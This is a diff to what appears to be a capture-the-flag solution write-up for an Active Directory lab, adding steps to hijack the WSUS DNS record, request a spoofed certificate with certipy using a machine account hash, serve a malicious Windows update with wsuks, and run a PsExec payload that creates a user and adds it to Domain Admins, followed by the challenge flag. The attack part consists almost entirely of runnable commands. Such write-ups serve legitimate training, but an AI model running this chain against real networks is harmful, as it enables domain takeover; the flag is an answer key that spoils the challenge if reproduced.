@@ -25,23 +25,34 @@
    2. `server agile-corp.hacklu`
    3. `zone agile-corp.hacklu`
    4. `update add wsus.agile-corp.hacklu. 86400 A 192.168.108.137`
-   5. `update delete wsus.agile-corp.hacklu. A 172.16.10.10`
+   5. `update delete wsus.agile-corp.hacklu. A 192.168.108.10`
    6. `send`
 10. `certipy req -dc-ip 192.168.108.10 -u SRV$ -hashes c05529a83e9df1e168d860edcb7cfa79 -template WebServer -target DC.agile-corp.hacklu -ca agile-corp-Root-CA -dns wsus.agile-corp.hacklu`
 11. `openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:`
-12. `sudo wsuks --WSUS-Server 192.168.108.10 --tls-cert wsus.pem --serve-only`
-13. Wait up to 5 minutes for WSUS updates on the DC.
+12. `sudo wsuks --WSUS-Server wsus.agile-corp.hacklu --tls-cert wsus.pem --serve-only`
+13. Wait up to 1 minute for WSUS updates on the DC.
+14. `nxc smb 192.168.108.10 -u user89834 -p 'mlOwZvWq9sb31!'`
 
 
 #### Manual invocations
 WSUKS command:
 ```Powershell
-PsExec64.exe /accepteula /s powershell.exe "New-ADUser -Name user89834 -AccountPassword $(ConvertTo-SecureString mlOwZvWq9sb31! -AsPlainText -Force) -Enabled $true"
+PsExec64.exe /accepteula /s powershell.exe "New-ADUser -Name user89834 -AccountPassword $(ConvertTo-SecureString mlOwZvWq9sb31! -AsPlainText -Force) -Enabled $true; Add-ADGroupMember -Identity 'Domain Admins' -Members user89834"
 ```
 
+Change wsus DNS entry:
+```Powershell
+Get-DnsServerResourceRecord -ZoneName agile-corp.hacklu -Name wsus -RRType A |
+  Remove-DnsServerResourceRecord -ZoneName agile-corp.hacklu -Force
+Add-DnsServerResourceRecordA -ZoneName agile-corp.hacklu -Name wsus -IPv4Address 192.168.108.10
+Clear-DnsClientCache
+```
 
 ```Powershell
 ipconfig /flushdns
 Import-Module PSWindowsUpdate
 Install-WindowsUpdate -AcceptAll -Install
 ```
+
+# Flag
+Flag: `flag{wds_wsu5_3nd_0f_l1f3_but_n0t_3nd_0f_us3_981zkja3}`
